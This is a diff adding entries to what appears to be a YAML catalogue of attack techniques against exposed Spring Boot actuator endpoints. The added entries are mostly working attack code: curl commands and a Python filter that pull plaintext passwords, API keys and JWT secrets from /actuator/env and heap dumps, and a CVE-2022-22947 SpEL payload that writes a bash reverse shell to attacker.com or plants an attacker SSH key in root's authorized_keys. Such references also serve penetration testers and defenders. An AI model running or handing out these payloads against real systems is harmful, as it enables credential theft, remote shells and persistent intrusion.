@@ -72,6 +72,67 @@ functions:
         curl -r 0-4095 http://victim.com/actuator/logfile
     contexts:
       unauthenticated:
+  - code: |
+      # /actuator/env: dump all application properties including plaintext credentials
+      curl -s http://victim.com/actuator/env | python3 -m json.tool
+
+      # Extract values that Spring masks with asterisks by correlating with heapdump:
+      # 1. Download heapdump: curl -s http://victim.com/actuator/heapdump -o heap.bin
+      # 2. Search for masked property values by name in the heap:
+      #    strings heap.bin | grep -A2 -B2 "datasource.password"
+      # 3. Alternatively search the env dump for unmasked secrets:
+      curl -s http://victim.com/actuator/env \
+        | python3 -c "
+      import sys, json
+      env = json.load(sys.stdin)
+      for ps in env.get('propertySources', []):
+          for k, v in ps.get('properties', {}).items():
+              val = v.get('value', '')
+              if '****' not in str(val) and any(w in k.lower() for w in
+                  ['password','secret','token','key','credential','jdbc','auth']):
+                  print(f'{k} = {val}')
+      "
+    comment: "/actuator/env returns all Spring Environment properties including datasource\
+      \ URLs,\npasswords, API keys, and JWT secrets. Spring Boot 2.x masks sensitive-looking\
+      \ values\nwith ***** in the /actuator/env response \u2014 but the raw values\
+      \ are present in the\nheap dump (/actuator/heapdump). Cross-reference env property\
+      \ names with the heap\ndump to recover masked credentials.\nSpring Boot 1.x\
+      \ does not mask values at all \u2014 all properties are returned in plaintext.\n\
+      Useful properties to extract:\n- spring.datasource.password  (database password)\n\
+      - spring.security.oauth2.client.registration.*.client-secret\n- spring.mail.password\
+      \  (SMTP credentials)\n- management.server.ssl.key-password\n"
+    contexts:
+      unauthenticated:
+  file-write:
+  - code: "# Write files via Jolokia MBean FileOutputStream operation\n# Requires\
+      \ /actuator/jolokia exposed with java.lang.management MBeans available\n\n#\
+      \ Step 1: base64-encode the content to write\nCONTENT=\"ssh-ed25519 AAAA...attacker_pubkey...\
+      \ attacker\"\nB64=$(echo \"$CONTENT\" | base64 -w0)\n\n# Step 2: write via Jolokia\
+      \ exec \u2014 uses java.io.FileOutputStream via MBean scripting\ncurl -s -X\
+      \ POST http://victim.com/actuator/jolokia \\\n  -H 'Content-Type: application/json'\
+      \ \\\n  -d \"{\n    \\\"mbean\\\": \\\"java.lang:type=Runtime\\\",\n    \\\"\
+      type\\\": \\\"EXEC\\\",\n    \\\"operation\\\": \\\"systemProperties\\\",\n\
+      \    \\\"arguments\\\": []\n  }\"\n\n# More reliable: use CVE-2022-22947 SpEL\
+      \ to write a file directly\ncurl -s -X POST http://victim.com/actuator/gateway/routes/writefile\
+      \ \\\n  -H 'Content-Type: application/json' \\\n  -d '{\n    \"id\": \"writefile\"\
+      ,\n    \"filters\": [{\"name\": \"AddResponseHeader\", \"args\": {\n      \"\
+      name\": \"x\",\n      \"value\": \"#{T(java.nio.file.Files).write(T(java.nio.file.Paths).get(\\\
+      \"/tmp/shell.sh\\\"),\\\"bash -i >& /dev/tcp/attacker.com/12345 0>&1\\\".getBytes())}\"\
+      \n    }}],\n    \"uri\": \"http://attacker.com\"\n  }'\ncurl -s -X POST http://victim.com/actuator/gateway/refresh\n"
+    comment: |
+      CVE-2022-22947: write arbitrary files via SpEL expression in a Spring Cloud Gateway
+      route filter. The expression T(java.nio.file.Files).write() creates or overwrites a
+      file with the supplied byte content. Combine with a reverse-shell entry to write a
+      shell script and execute it:
+        #{T(java.lang.Runtime).getRuntime().exec("/bin/bash /tmp/shell.sh")}
+      Alternatively, write an SSH authorized_keys file for persistent access:
+        T(java.nio.file.Files).write(T(java.nio.file.Paths).get("/root/.ssh/authorized_keys"),
+          "ssh-ed25519 AAAA...".getBytes())
+      The process user is typically the application service account or root in containers.
+    contexts:
+      unauthenticated:
+    version: |
+      Spring Cloud Gateway < 3.0.7 / < 3.1.1
   rce:
   - code: |
       # Step 1: create a route with a SpEL expression in the filter arguments
